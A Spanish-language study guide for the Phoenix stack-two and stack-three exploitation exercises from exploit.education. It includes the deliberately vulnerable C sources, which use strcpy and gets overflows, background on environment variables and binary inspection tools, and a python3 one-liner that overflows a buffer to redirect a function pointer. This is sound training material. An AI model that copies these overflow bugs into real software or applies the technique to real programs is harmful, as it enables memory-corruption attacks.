Ejercicio stack-two

Código

/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}

Teoría

Variables de entorno

  • Significado
  • Variable definida por usuario.
  • Afecta la ejecución y el comportamiento de procesos en una computadora.
  • Parte del entorno de ejecución de un proceso.
  • Ejemplos: $PATH $HOME $PS1 $EDITOR $TEMP…
  • ¿Qué hace export PS1='hola: '?
  • ¿Qué hace export PS1='($?) \u en \h: '?
  • export configura una variable de entorno para procesos hijos.

Asignando una variable de entorno temporalmente a un proceso

ENVVAR_TEMP='hola' comando

Caracteres no imprimibles

  • ¿Qué caracteres corresponden a estos hexadecimales en ASCII?
  • 0x0d
  • 0x0a
  • 0x09
  • 0x0a

¿Cómo imprimimos estos caracteres?

  • How to write a raw hex byte to stdout in Python 3?
python3 -c 'import sys; sys.stdout.buffer.write(b"\x48\x6f\x6c\x61\x0a\xf0\x9f\x8c\x8a\x0a")'
#                   ^                           ^             ^^
#                modulo                   objeto bytes     separador

Sustitución de comandos (command substitution)

  • Permite asignar la salida de un comando como valor a una variable de la shell.
  • Sintaxis y ejemplo:

Ejercicio stack-three

Código

/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}

Objetivo

  • ¿Cómo resolvemos el nivel?

Teoría

Alternativa para obtener desensamblado

  • objdump muestra información de archivos objeto.
  • Podemos obtener el desensamblado invocando directamente.
objdump -d -M intel ARCHIVO

Archivos objeto

  • Enlace.
  • Son aquellos que contienen código máquina o bytecode y los genera un compilador o ensamblador.
  • Hasta ahora hemos usado archivos objeto ELF, aunque también existen los COFF y Mach-O

Resolviendo stack-three…

  1. Entender código
  2. Identificar dirección de función a la que saltar
  3. Sobrescribir búfer con dirección

Solución

Obtenemos la dirección de la función complete_level, sobreescribimos el buffer y pasamos la direction encontrada. 

nm -C --defined-only /opt/phoenix/amd64/stack-three # Opción 1
readelf -s /opt/phoenix/amd64/stack-three # Opción 2
objdump -M intel -d /opt/phoenix/amd64/stack-three | grep -A6 "complete_level" # Opción 3
objdump -d /opt/phoenix/amd64/stack-three | awk '/complete_level/ {print $1}'
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x9d\x06\x40")' | /opt/phoenix/amd64/stack-three
